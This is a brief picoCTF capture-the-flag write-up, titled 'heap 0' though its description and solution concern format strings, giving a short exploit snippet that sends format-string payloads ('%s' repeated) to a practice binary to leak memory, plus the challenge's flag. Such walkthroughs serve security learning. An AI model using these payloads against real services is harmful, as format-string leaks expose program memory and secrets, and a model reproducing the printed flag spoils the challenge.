# heap 0

**Link**: https://play.picoctf.org/practice/challenge/433

**difficulty**: easy

## Description

Can you use your knowledge of format strings to make the customers happy?

## Resources

**chall**: binary file

**chall.c**: source code

## How to solve

Example snippet (inside your exploit script):

    print(io.recvuntil(b'recommendation: ').decode())
    io.sendline(b'Gr%114d_Cheese') 
    print(io.recvuntil(b'recommendation: ').decode())
    io.sendline(b'%s'*16) 
    print(io.recvall().decode())

At the end you should get the flag:

    picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}

